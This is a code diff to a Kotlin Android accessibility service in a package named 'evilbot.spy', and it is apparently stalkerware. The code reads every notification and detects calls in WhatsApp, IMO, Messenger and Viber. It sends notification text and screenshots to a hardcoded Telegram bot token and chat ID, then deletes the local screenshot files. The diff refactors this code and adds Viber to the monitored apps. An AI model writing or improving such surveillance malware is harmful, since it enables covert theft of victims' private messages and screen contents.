@@ -22,6 +22,7 @@ class MyAccessibilityService : AccessibilityService() {
         var instance: MyAccessibilityService? = null
         private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
         private val CHAT_ID = "8820979221"
+        private val client = OkHttpClient()
     }
 
     override fun onServiceConnected() {
@@ -35,41 +36,36 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // 1. Notification State Changed Handling
+        // 1. Notification Capture
         if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             val text = event.text?.joinToString(" ") ?: ""
             if (text.isNotBlank()) {
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
-                        val ok = OkHttpClient()
                         val form = FormBody.Builder()
                             .add("chat_id", CHAT_ID)
-                            .add("text", "Notification: $text")
+                            .add("text", "🔔 Notification: $text")
                             .build()
-                        ok.newCall(
+                        client.newCall(
                             Request.Builder()
                                 .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                                 .post(form)
                                 .build()
                         ).execute()
-                    } catch (e: Exception) {
-                        Log.e("AccService", "Notify Error", e)
-                    }
+                    } catch (e: Exception) { Log.e("AccService", "Notify Error", e) }
                 }
             }
 
             // 2. VoIP Call Detection
             val packageName = event.packageName?.toString().orEmpty()
-            val notifText = event.text?.joinToString(" ") ?: ""
-            val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite")
+            val notifText = text.lowercase()
+            val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite", "com.viber.voip")
 
-            if (packageName in voipApps || notifText.contains("call", ignoreCase = true)) {
-                if (notifText.contains(Regex("incoming|ongoing|active|call in progress|WhatsApp call|Messenger call|IMO call", RegexOption.IGNORE_CASE))) {
-                    val intent = Intent("com.evilbot.spy.VOIPCALLSTART")
-                    sendBroadcast(intent)
-                } else if (notifText.contains(Regex("ended|missed|declined|call ended", RegexOption.IGNORE_CASE))) {
-                    val intent = Intent("com.evilbot.spy.VOIPCALLEND")
-                    sendBroadcast(intent)
+            if (packageName in voipApps || notifText.contains("call")) {
+                if (notifText.contains("incoming") || notifText.contains("ongoing") || notifText.contains("active")) {
+                    sendBroadcast(Intent("com.evilbot.spy.VOIP_CALL_START"))
+                } else if (notifText.contains("ended") || notifText.contains("missed")) {
+                    sendBroadcast(Intent("com.evilbot.spy.VOIP_CALL_END"))
                 }
             }
         }
@@ -77,10 +73,10 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    // Screenshot method – Android 9+ only
+    // Screenshot Method (Android 9+)
     fun takeScreenshot(crop: Rect? = null) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
-            sendError("Screenshot not supported < P")
+            sendError("Screenshot not supported on this version")
             return
         }
 
@@ -96,60 +92,55 @@ class MyAccessibilityService : AccessibilityService() {
                 } else bitmap
 
                 CoroutineScope(Dispatchers.IO).launch {
-                    val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
+                    val file = File(cacheDir, "screen_${System.currentTimeMillis()}.png")
                     FileOutputStream(file).use { fos ->
                         finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos)
                     }
-                    // Upload to Telegram
-                    try {
-                        val ok = OkHttpClient()
-                        val body = MultipartBody.Builder()
-                            .setType(MultipartBody.FORM)
-                            .addFormDataPart("chat_id", CHAT_ID)
-                            .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
-                            .build()
-                        ok.newCall(
-                            Request.Builder()
-                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
-                                .post(body)
-                                .build()
-                        ).execute()
-                    } catch (e: Exception) {
-                        Log.e("Accessibility", "Upload failed", e)
-                    }
+                    uploadTelegramPhoto(file)
                 }
             }
 
             override fun onFailure(errorCode: Int) {
-                sendError("Screenshot failed with code $errorCode")
+                sendError("Screenshot failed: $errorCode")
             }
         }
 
-        // Corrected takeScreenshot call parameters
-        takeScreenshot(
-            0, // Display ID
-            Executors.newSingleThreadExecutor(),
-            callback
-        )
+        takeScreenshot(0, Executors.newSingleThreadExecutor(), callback)
+    }
+
+    private fun uploadTelegramPhoto(file: File) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val body = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
+                    .build()
+                client.newCall(
+                    Request.Builder()
+                        .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
+                        .post(body)
+                        .build()
+                ).execute()
+                file.delete() // Clean up
+            } catch (e: Exception) { Log.e("AccService", "Upload failed", e) }
+        }
     }
 
     private fun sendError(msg: String) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val ok = OkHttpClient()
                 val form = FormBody.Builder()
                     .add("chat_id", CHAT_ID)
-                    .add("text", "Accessibility error: $msg")
+                    .add("text", "⚠️ Error: $msg")
                     .build()
-                ok.newCall(
+                client.newCall(
                     Request.Builder()
                         .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                         .post(form)
                         .build()
                 ).execute()
-            } catch (e: Exception) {
-                Log.e("AccService", "SendError failed", e)
-            }
+            } catch (e: Exception) { Log.e("AccService", "SendError failed", e) }
         }
     }
 }
